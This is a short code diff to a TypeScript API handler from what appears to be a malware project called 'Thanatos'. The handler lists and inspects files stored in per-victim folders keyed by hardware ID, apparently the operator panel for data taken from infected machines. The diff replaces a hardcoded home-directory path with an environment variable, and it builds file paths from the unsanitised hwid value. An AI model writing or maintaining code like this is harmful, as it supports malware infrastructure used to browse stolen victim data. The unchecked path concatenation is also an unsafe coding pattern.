@@ -20,11 +20,11 @@ export default function handler(
     res.status(400).end();
     return;
   }
-  const files = fs.readdirSync('/home/nestyles/Documents/Thanatos/server/victims/' + hwid);
+  const files = fs.readdirSync(process.env.VICTIMS_PATH + hwid);
   const files_infos = files.map(file => {
     let info: Info = {
       name: file,
-      info: fs.statSync('/home/nestyles/Documents/Thanatos/server/victims/' + hwid + '/' + file)
+      info: fs.statSync(process.env.VICTIMS_PATH + hwid + '/' + file)
     };
     console.log(info);
     return info;
